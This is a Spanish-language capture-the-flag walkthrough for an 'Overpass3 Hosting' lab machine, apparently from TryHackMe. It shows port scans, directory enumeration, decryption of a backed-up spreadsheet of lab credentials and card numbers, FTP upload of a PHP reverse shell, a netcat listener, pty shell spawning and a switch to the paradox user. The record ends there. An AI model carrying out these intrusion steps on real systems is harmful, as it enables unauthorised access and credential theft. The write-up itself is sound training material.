@@ -1,0 +1,253 @@
+#Overpass3Hosting walkthrough
+#Los cambios de ip en la máquina se deben a que a la he completado en varios días, o al reinicio de la misma.
+
+Me espero 5 minutos a que inicie la máquina y lanzo el primer escaneo de puertos.
+
+sudo nmap -p- 10.129.166.89
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-20 12:29 CEST
+Stats: 0:02:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 79.77% done; ETC: 12:31 (0:00:33 remaining)
+Nmap scan report for 10.129.166.89
+Host is up (0.039s latency).
+Not shown: 65366 filtered tcp ports (no-response), 166 filtered tcp ports (admin-prohibited)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 161.46 seconds
+
+Ahora hago un -sVC para completar la enumeración de puertos.
+
+sudo nmap -sVC -p 21,22,80 10.129.166.89
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-20 12:32 CEST
+Nmap scan report for 10.129.166.89
+Host is up (0.086s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
+|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
+|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.37 ((centos))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos)
+|_http-title: Overpass Hosting
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
+
+El escaneo -sVC no me indica que haya login anónimo en el puerto 21, comienzo por el 80.
+
+Veo el código de la página de inicio en el puerto 80 y saco varios nombres de empleados.
+
+Paradox
+Elf
+MuirlandOracle
+NinjaJc01
+
+Puede que me sirvan mas adelante.
+
+Enumero subdirectorios.
+
+ sudo dirsearch -u http://10.129.166.89/
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/mksk/reports/http_10.129.166.89/__26-08-20_12-35-36.txt
+
+Target: http://10.129.166.89/
+
+[12:35:36] Starting: 
+[12:35:38] 403 -  220B  - /.ht_wsr.txt
+[12:35:38] 403 -  223B  - /.htaccess.bak1
+[12:35:38] 403 -  223B  - /.htaccess.orig
+[12:35:38] 403 -  225B  - /.htaccess.sample
+[12:35:38] 403 -  223B  - /.htaccess.save
+[12:35:38] 403 -  224B  - /.htaccess_extra
+[12:35:38] 403 -  223B  - /.htaccess_orig
+[12:35:38] 403 -  221B  - /.htaccessBAK
+[12:35:38] 403 -  222B  - /.htaccessOLD2
+[12:35:38] 403 -  221B  - /.htaccess_sc
+[12:35:38] 403 -  221B  - /.htaccessOLD
+[12:35:38] 403 -  213B  - /.htm
+[12:35:38] 403 -  214B  - /.html
+[12:35:38] 403 -  220B  - /.httr-oauth
+[12:35:38] 403 -  219B  - /.htpasswds
+[12:35:38] 403 -  223B  - /.htpasswd_test
+[12:35:41] 403 -  218B  - /.user.ini
+[12:35:47] 301 -  237B  - /backups  ->  http://10.129.166.89/backups/
+[12:35:47] 200 -  894B  - /backups/
+[12:35:48] 403 -  217B  - /cgi-bin/
+[12:35:49] 404 -   16B  - /composer.phar
+[12:35:53] 404 -   16B  - /index.php/login/
+[12:35:58] 404 -   16B  - /php-cs-fixer.phar
+[12:35:59] 404 -   16B  - /phpunit.phar
+
+
+Encuentro la carpeta backups. Hay un archivo .zip dentro, lo descargo.
+
+Al descomprimirlo veo una clave .gpg y un archivo de xlsx.gpg.
+
+Importo la clave.
+
+~/cosasctf/hosting$ gpg --import priv.key
+gpg: clave C9AE71AB3180BC08: clave pública "Paradox <paradox@overpass.thm>" importada
+gpg: clave C9AE71AB3180BC08: clave secreta importada
+gpg: Cantidad total procesada: 1
+gpg:               importadas: 1
+gpg:       claves secretas leídas: 1
+gpg:   claves secretas importadas: 1
+
+Y desencripto el xlsx.
+
+ gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
+gpg: encrypted with rsa2048 key, ID 9E86A1C63FB96335, created 2020-11-08
+      "Paradox <paradox@overpass.thm>"
+gpg: NOTA: clave secreta 9E86A1C63FB96335 caducó el mar 08 nov 2022 22:14:31 CET
+
+La salida del comando indica que la clave ha caducado pero el xlsx se ha desencriptado correctamente.
+
+Customer Name	Username	Password	Credit card number	CVC
+Par. A. Doxx	paradox	ShibesAreGreat123	4111 1111 4555 1142	432
+0day Montgomery	0day	OllieIsTheBestDog	5555 3412 4444 1115	642
+Muir Land	muirlandoracle	A11D0gsAreAw3s0me	5103 2219 1119 9245	737
+
+Es una hoja de cálculo con credenciales.
+
+Pruebo por ftp.
+
+Con el primer set de credenciales consigo acceso a ftp y me bajo los archivos que parecen relevantes.
+
+~/cosasctf/hosting$ ftp 10.129.166.89
+Connected to 10.129.166.89.
+220 (vsFTPd 3.0.3)
+Name (10.129.166.89:mksk): paradox
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> get hallway.jpg
+local: hallway.jpg remote: hallway.jpg
+229 Entering Extended Passive Mode (|||25735|)
+150 Opening BINARY mode data connection for hallway.jpg (65591 bytes).
+100% |*******************************************************************| 65591      942.97 KiB/s    00:00 ETA
+226 Transfer complete.
+65591 bytes received in 00:00 (643.09 KiB/s)
+ftp> get index.html
+local: index.html remote: index.html
+229 Entering Extended Passive Mode (|||9587|)
+150 Opening BINARY mode data connection for index.html (1770 bytes).
+100% |*******************************************************************|  1770       60.28 MiB/s    00:00 ETA
+226 Transfer complete.
+1770 bytes received in 00:00 (56.54 KiB/s)
+ftp> get overpass.svg
+local: overpass.svg remote: overpass.svg
+229 Entering Extended Passive Mode (|||47512|)
+150 Opening BINARY mode data connection for overpass.svg (2511 bytes).
+100% |*******************************************************************|  2511       33.72 MiB/s    00:00 ETA
+226 Transfer complete.
+2511 bytes received in 00:00 (79.18 KiB/s)
+ftp> exit
+221 Goodbye.
+
+Los otros sets de credenciales no me dejan hacer login en ftp.
+Pruebo por ssh, sin éxito.
+
+Dado que los archivos que me he descargado no me llevan a ninguna parte, intuyo que tendré que seguir por ftp.
+
+Vuelvo a conectarme, y pruebo a subir la revhsell de pentestmonkey.
+
+~/cosasctf$ ftp 10.129.166.89
+Connected to 10.129.166.89.
+220 (vsFTPd 3.0.3)
+Name (10.129.166.89:mksk): paradox
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> put re
+reports		revshell.php	revshell.py
+ftp> put revshell.php 
+local: revshell.php remote: revshell.php
+229 Entering Extended Passive Mode (|||53597|)
+150 Ok to send data.
+100% |************************************************************************************************************|  2588       17.25 MiB/s    00:00 ETA
+226 Transfer complete.
+2588 bytes sent in 00:00 (30.16 KiB/s)
+ftp> 
+
+Bueno, ahora inicio un listener y la ejecuto.
+
+sudo nc -lnvp 9003
+Listening on 0.0.0.0 9003
+
+http://10.129.166.89/revshell.php
+
+Y consigo acceso.
+
+Listening on 0.0.0.0 9003
+Connection received on 10.129.166.89 58776
+Linux ip-10-129-166-89 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 11:55:36 up 31 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: cannot set terminal process group (870): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-4.4$ 
+
+Tras buscar un rato, la primera flag la encuentro en /usr/share/httpd
+
+sh-4.4$ pwd
+pwd
+/usr/share/httpd
+
+sh-4.4$ ls
+ls
+error
+icons
+noindex
+web.flag
+
+sh-4.4$ cat web.flag
+cat web.flag
+thm{0a*************************}
+
+Al hacer sudo -l, veo que tengo acceso, y pruebo a cambiar de usuario.
+
+sh-4.4$ sudo -l
+sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+
+Hago la shell interactiva.
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+bash-4.4$ su - paradox
+su - paradox
+Password: ShibesAreGreat123
+
+Last login: Wed Nov 18 18:33:57 GMT 2020 from 192.168.170.145 on pts/0
+[paradox@ip-10-129-166-89 ~]$ 
+
+Y con el primer set consigo acceso como paradox.
+
+
